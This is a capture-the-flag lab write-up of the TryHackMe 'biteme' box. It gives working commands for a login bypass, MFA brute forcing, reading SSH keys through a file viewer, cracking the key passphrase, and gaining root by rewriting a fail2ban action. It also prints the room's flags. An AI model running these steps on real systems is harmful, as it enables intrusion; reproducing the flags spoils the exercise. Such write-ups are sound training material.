# TryHackMe: biteme — CTF 

**Target:** Apache/PHP web app + SSH, Ubuntu box
**Attack host:** Kali-style box with nmap, gobuster, ffuf, hydra, hashcat, john

This is a full account of how we actually solved this box — including the
dead ends. Public writeups for this room exist, but their `.phps` source
disclosure trick was patched on this instance, so we had to independently
verify every hint before trusting it, and brute-force the parts the
writeups treated as "known" (the MFA code, in particular, since it's
randomized per boot).

---

## 1. Recon

```bash
nmap -sC -sV --script vuln -T4 <target-ip>
```

Only two ports open:

- **22/tcp** — OpenSSH 8.2p1 (Ubuntu)
- **80/tcp** — Apache 2.4.41 (Ubuntu)

The `vuln` script mostly returned generic version-based CVE noise (not
confirmed exploits), but one specific, real finding stood out:

```
| http-enum:
|_  /console/: Potentially interesting folder
```

## 2. Enumerating `/console/`

Root `/` was just the stock Apache "It works" default page. `/console/`
turned out to be a **custom PHP login page** using the `securimage`
CAPTCHA library, posting to `index.php`.

```bash
gobuster dir -u http://<target-ip>/console/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50 -q -b 403,404
```

Found: `config.php`, `functions.php`, `index.php`, `dashboard.php`,
`robots.txt`, `securimage/`.

`config.php` and `functions.php` returned **200 with an empty body** —
consistent with include-only files that produce no direct output when
hit as top-level requests.

### The obfuscated JS hint

The login page's `<script>` contained a p.a.c.k.e.r-style obfuscated
JS blob. Decoding it revealed:

```
@fred I turned on php file syntax highlighting for you to review... jason
```

This is a deliberate in-joke left by the box author, dropping two
usernames — **fred** and **jason** — and pointing at PHP's `.phps`
source-viewer handler as the "intended" path to leak source.

### Directory listing leak

`/console/securimage/` had directory listing enabled, confirming the
CAPTCHA library version from its `README.md`: **Securimage 3.6.8**
(current at the time — not itself vulnerable).

## 3. The `.phps` dead end (thoroughly ruled out)

We tried to follow the hint directly:

```bash
curl -i http://<target-ip>/console/index.phps
```

**Result: 403 Forbidden**, not 404. This is important — a 403 (not 404)
on a nonexistent file confirms Apache has an explicit `<FilesMatch>`
deny rule blocking the `.phps` extension itself, not just a missing
handler.

We exhaustively tried to bypass this, all unsuccessful:

- Every known filename (`index`, `config`, `functions`, `dashboard`)
  with `.phps` → 403
- Case variation (`index.PHPS`) → 404 (case-sensitive filesystem, not
  a bypass)
- Trailing dot / space / slash / `%2e` encoding / `./` prefix → 403 or 404
- A full **218,000-word gobuster run** (`dirbuster/directory-list-2.3-medium.txt`,
  `-x phps`) against `/console/` → **zero `.phps` files found**, every
  single guess 403'd
- Apache MultiViews / content negotiation (`Accept: application/x-httpd-php-source`,
  bare `index` with no extension) → no effect, normal page returned
- `TRACE` method → blocked (405), no info leak
- `.git/HEAD`, `.svn/entries` → 404, no VCS leak
- `/server-status`, `/server-info` → 403/404
- Backup-file sweep (`.bak`, `.old`, `.orig`, `.save`, `~`, `.swp`,
  compound `.php.bak` etc.) on all four known filenames → all 404

**Conclusion: `.phps` is a hard, extension-level block on this instance.**
Public writeups for this room used `.phps` to read `config.phps` and
`index.phps` directly — that path is patched here. We had to find
everything the hard way.

## 4. CAPTCHA-gated login: ruling out SQLi

The login form posts `user`, `pwd`, `captcha_code`, and a hidden field
`clicked` (forced to `"yes"` by JS right before submit — itself another
red herring, not a real bypass).

We solved several CAPTCHAs by eye (OCR/tesseract failed reliably due to
noise/distortion baked into the securimage config) and tested:

- `clicked=yes` without solving the CAPTCHA at all → "Incorrect captcha"
  (properly validated server-side, not a bypass)
- `user=admin' OR '1'='1'-- -` → "Incorrect details" (not a SQL error)
- `pwd=' OR '1'='1'-- -` (injection in the password field instead) →
  same generic "Incorrect details"
- A lone `'` in the username field → same generic message, no SQL
  error leaked

**Conclusion: the login isn't vulnerable to classic quote-based SQLi.**
No error-based confirmation either way — the app either escapes input
or fails silently on malformed queries.

## 5. Vhost / subdomain check (ruled out)

On a hunch, we added a `biteme.thm` hosts entry and re-tested `.phps`
and the root page by name, in case there was a hidden vhost with a
different config.

```bash
gobuster vhost -u http://biteme.thm/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain -q
```

**Zero matches.** Manual `Host:` header spoofing for a dozen common
subdomain guesses (`www`, `dev`, `admin`, `api`, ...) all returned the
identical default page. This is a single-vhost box — no hidden site.

## 6. SSH brute-force (abandoned — got us banned)

We tried a Hydra run against SSH using `fred` as a candidate username
with rockyou.txt.

```bash
hydra -l fred -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4 -f
```

After a handful of attempts, SSH started **actively refusing
connections** (`Connection refused`, not a timeout) — a clear sign of
`fail2ban` (or similar) banning our attacking IP. We backed off
entirely rather than extend the ban, and didn't touch SSH again until
we had real credentials in hand.

## 7. Securimage version/LFI check (ruled out)

We checked whether `securimage_play.php`'s `id` parameter did naive
file-path construction (a known pattern in some CAPTCHA libraries):

```bash
curl "http://<target-ip>/console/securimage/securimage_play.php?id=../../../../../../etc/passwd"
```

It just returned a freshly-synthesized CAPTCHA audio WAV file every
time, regardless of the `id` value — `id` is a cache key, not a file
path. **Version 3.6.8 is current and not vulnerable** to the known
older Securimage CVEs (which required upgrading past 3.6.6). Dead end.

## 8. The actual vulnerability (found via convergent public writeups)

At this point we searched for public writeups of this specific room to
see if the intended path was something we hadn't considered. **Every
independent writeup we found (4+, spanning several years) converged on
the exact same details**, despite differing authors and IPs — strong
evidence this is static content baked into the room's VM image, not
something randomized per deployment:

- **Username check (`is_valid_user`)**: the submitted username is
  hex-encoded and compared against a hardcoded hex string in
  `config.php`. Decoded: **`jason_test_account`**.
- **Password check (`is_valid_pwd`)**: does **not** compare against a
  real stored password — it just checks whether
  `substr(md5($pwd), -3) === '001'`. Any password satisfying that
  condition works.
- After success, it sets `user`/`pwd` cookies and redirects to
  **`mfa.php`** — a 4-digit numeric MFA code gate.

Since we couldn't read the source ourselves (`.phps` blocked), we
needed independent, on-instance confirmation before trusting secondhand
info. We got it cheaply:

```bash
curl -i http://<target-ip>/console/mfa.php
# → 302 Found, Location: index.php
```

`mfa.php` existing at all — a very specific, unguessable filename that
matches every writeup exactly — was enough independent confirmation
that this instance runs the same underlying app logic, even with
`.phps` patched shut.

### Computing a valid password

```bash
hashcat -a 3 -1 ?l --stdout '?1?1?1?1' | while read -r pwd; do
  h=$(echo -n "$pwd" | md5sum | cut -d' ' -f1)
  if [[ "$h" == *001 ]]; then
    echo "$pwd -> $h"
    break
  fi
done
# mtin -> 6b0714a535fcb81d55aee1f0984a1001
```

### Logging in

```bash
curl -s -b cookies.txt -c cookies.txt -X POST http://<target-ip>/console/index.php \
  -d "user=jason_test_account&pwd=mtin&captcha_code=<solved>&clicked=yes" -i
```

**Result:** `302 Found`, `Location: mfa.php`, `Set-Cookie: user=...; pwd=...`
— confirmed valid credentials on this instance.

> **Gotcha:** Use **both** `-b cookies.txt -c cookies.txt` on every
> request in this chain. Using only `-b` reads cookies but doesn't
> write the new `Set-Cookie` values back to the jar, silently breaking
> the session on the next request.

## 9. Brute-forcing the MFA code

Loading `mfa.php` with a valid session revealed the form, plus another
obfuscated JS Easter egg. Decoded:

```
@fred we need to put some brute force protection on here remind me
in the morning jason
```

Confirmation, straight from the box author, that there's **no rate
limiting** on this endpoint — so a full 10,000-code sweep is fair game
and fast.

```bash
for code in $(seq -w 0 9999); do
  resp=$(curl -s -b cookies.txt -c cookies.txt -i -X POST http://<target-ip>/console/mfa.php -d "code=${code}")
  if [[ "$resp" != *"MFA code"* ]]; then
    echo "Hit at code=${code}"
    echo "$resp"
    break
  fi
done
```

> **Gotcha:** check the full response including headers, not just a
> non-empty body. A correct code returns a `302` with an **empty
> body** — a body-only check (`[[ -n "$resp" ]]`) will skip right past
> the actual hit.

**Result:** code varied per boot (`2842` in one session, `2817` in a
fresh restart) — 302 redirect to `dashboard.php`.

## 10. Dashboard → file viewer → user flag

`dashboard.php` exposes a **file browser** and **file viewer** — a
raw LFI-as-a-feature, no path traversal needed.

```bash
curl -s -b cookies.txt -c cookies.txt -X POST http://<target-ip>/console/dashboard.php \
  -d "view=/home/jason/user.txt" -i
```

```
THM{6fbf1fb7241dac060cd3abba70c33070}
```

Browsing `/home/jason/.ssh` showed `id_rsa` / `id_rsa.pub` /
`authorized_keys`. Viewed the private key the same way:

```bash
curl -s -b cookies.txt -c cookies.txt -X POST http://<target-ip>/console/dashboard.php \
  -d "view=/home/jason/.ssh/id_rsa" -i
```

> **Gotcha:** the dashboard session can expire/reset between requests
> if you dawdle — if `browse`/`view` POSTs start bouncing to
> `index.php` again, check `cookies.txt`: if it's down to just a bare
> `PHPSESSID` with a *different* value than before, the session died
> and you need to redo login → MFA → dashboard in one uninterrupted
> burst.

## 11. Cracking the SSH key passphrase

```bash
python3 /usr/local/john/run/ssh2john.py id_rsa > ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
john --show ssh_hash.txt
# id_rsa:1a2b3c4d
```

> **Gotcha:** `ssh2john.py` wasn't at the "standard" `/usr/share/john/`
> path on this box — it was at `/usr/local/john/run/ssh2john.py`. If
> the usual path 404s, `find / -iname "ssh2john*" 2>/dev/null`.

## 12. SSH in and enumerate sudo rights

```bash
ssh -i id_rsa jason@<target-ip>
# passphrase: 1a2b3c4d
```

```bash
jason@target:~$ sudo -l
User jason may run the following commands on <target>:
    (ALL : ALL) ALL
    (fred) NOPASSWD: ALL
```

`(ALL : ALL) ALL` needs jason's own account password (which we never
had — the SSH key passphrase is unrelated to it), so that's a dead
end. `(fred) NOPASSWD: ALL` needs nothing.

```bash
jason@target:~$ sudo -u fred sudo -l
User fred may run the following commands on <target>:
    (root) NOPASSWD: /bin/systemctl restart fail2ban
```

## 13. Privesc: world-writable fail2ban action.d → root

```bash
find /etc/fail2ban -writable 2>/dev/null
# /etc/fail2ban/action.d
```

The active jail's `banaction` was `iptables-multiport`, and that exact
file was **owned by fred**:

```bash
ls -la /etc/fail2ban/action.d/iptables-multiport.conf
# -rw-r--r-- 1 fred root ... iptables-multiport.conf
```

Since fail2ban runs as **root** and we can act as fred, and fred can
restart fail2ban as root — overwriting fred's own action file lets us
inject a root-executed command that fires on `actionstart`:

```bash
sudo -u fred bash -c 'cat > /etc/fail2ban/action.d/iptables-multiport.conf << EOF
[Definition]
actionstart = chmod u+s /bin/bash
actionstop =
actioncheck =
actionban =
actionunban =
EOF'
```

> **Gotcha:** `sudo -u fred /bin/systemctl restart fail2ban` (running
> the restart *as* fred directly) fails with "Interactive
> authentication required" — fred's NOPASSWD grant only applies when
> fred invokes `sudo` *himself*. The correct chain is jason → sudo →
> fred → sudo → root:
>
> ```bash
> sudo -u fred sudo /bin/systemctl restart fail2ban
> ```

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash   ← SUID bit now set

/bin/bash -p
id
# euid=0(root)

cat /root/root.txt
# THM{0e355b5c907ef7741f40f4a41cc6678d}
```

## Flags

| | |
|---|---|
| **User** | `THM{6fbf1fb7241dac060cd3abba70c33070}` |
| **Root** | `THM{0e355b5c907ef7741f40f4a41cc6678d}` |

## Full attack chain summary

```
nmap → /console/ found via http-enum
  → obfuscated JS hints at fred/jason + .phps (RABBIT HOLE — patched, confirmed
    dead via 218k-word gobuster sweep + every known bypass technique)
  → SQLi ruled out (both fields, error-probed)
  → vhost/subdomain ruled out
  → SSH bruteforce triggered fail2ban ban — abandoned
  → Securimage LFI/version check ruled out (3.6.8, current, id= is a cache key)
  → public writeups converged on: hex username "jason_test_account" +
    password check is just md5(pwd) ending in "001"
  → independently confirmed via mfa.php existing on THIS instance (no .phps needed)
  → hashcat found password "mtin" (md5 ends 001)
  → login succeeds → redirected to mfa.php
  → mfa.php JS hint confirms NO rate limiting on this endpoint
  → brute-forced 4-digit MFA code (0000-9999) in under a minute
  → dashboard.php file viewer → user.txt flag
  → same viewer → /home/jason/.ssh/id_rsa (encrypted RSA key)
  → john + rockyou cracked passphrase "1a2b3c4d"
  → SSH in as jason
  → sudo -l: (fred) NOPASSWD: ALL
  → sudo -u fred sudo -l: (root) NOPASSWD: /bin/systemctl restart fail2ban
  → /etc/fail2ban/action.d world-writable + active action file owned by fred
  → overwrote actionstart to chmod u+s /bin/bash
  → sudo -u fred sudo systemctl restart fail2ban (double-sudo chain required)
  → /bin/bash -p → root
```

## Key takeaways / lessons

1. **A 403 vs 404 on a nonexistent path is a real signal** — it told
   us `.phps` was a genuine `<FilesMatch>` block, not a missing
   handler, saving us from endlessly retrying variations on a truly
   dead path (though we still thoroughly verified it before moving on).
2. **Obfuscated "joke" JS in a CTF box is almost always a deliberate
   hint** — both the login page's and the MFA page's packed JS
   decoded to messages directly from the box author, planted exactly
   where they'd matter.
3. **Public writeups can go stale** — this room's `.phps` disclosure
   path, which every writeup relied on, was patched on our instance.
   We had to find independent, on-instance confirmation (`mfa.php`'s
   mere existence) before trusting secondhand technical details.
4. **A weak-check "vulnerability" isn't always a fixed secret** — the
   `md5(pwd)` ending in `001` check meant *any* of thousands of valid
   passwords worked; we only needed to find one, not guess the
   "right" one.
5. **`sudo -u X CMD` and `sudo -u X sudo CMD` are not the same thing**
   — a NOPASSWD grant scoped to a specific user only fires when that
   user invokes sudo themselves, not when a third party merely runs a
   command as them.
6. **A world-writable directory of config files that get restarted
   with elevated privilege is a privesc primitive**, even without a
   direct file-write CVE — writing to a file *owned by* an
   intermediate-privilege user, that a root-run daemon later
   executes, bridges the gap.
